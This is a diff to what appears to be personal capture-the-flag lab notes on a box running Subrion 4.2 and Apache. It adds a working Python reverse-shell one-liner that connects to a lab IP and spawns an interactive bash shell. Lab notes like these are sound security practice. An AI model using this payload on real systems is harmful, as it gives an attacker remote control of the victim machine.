@@ -48,6 +48,9 @@ venom.box -> add to hosts -> webpage -> Powered by Subrion 4.2
 
 ![[Pasted image 20250819041003.png]]
 
+rev shell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
 
 80: Apache httpd 2.4.29 ((Ubuntu)) 
 443: Apache httpd 2.4.29
